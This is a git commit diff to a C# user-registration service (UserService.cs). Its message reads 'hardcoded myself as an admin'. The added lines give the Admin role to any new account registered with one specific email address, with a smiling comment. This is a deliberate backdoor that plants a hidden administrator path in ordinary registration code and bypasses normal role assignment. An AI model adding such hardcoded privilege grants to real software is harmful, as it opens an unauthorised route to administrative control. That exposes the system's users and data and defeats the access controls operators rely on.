d77d0337385a5167254871da2331b8ceea494681
Jonathan Collins <jonny.collins111@gmail.com>
2026-09-25 17:47:53 +0100

    hardcoded myself as an admin

--- UserAPI/UserService.cs
+++ UserAPI/UserService.cs
@@ -70,6 +70,10 @@ namespace UserAPI
                 Role = "User",
                 PasswordHash = BCrypt.Net.BCrypt.HashPassword(userDto.Password)
             };
+            if (user.Email == "Jonny.collins111@gmail.com")
+            {
+                user.Role = "Admin"; //Hardcode myself as an admin :)
+            }
 
             // Add the new user to the database 
             await _userRepository.AddAsync(user);
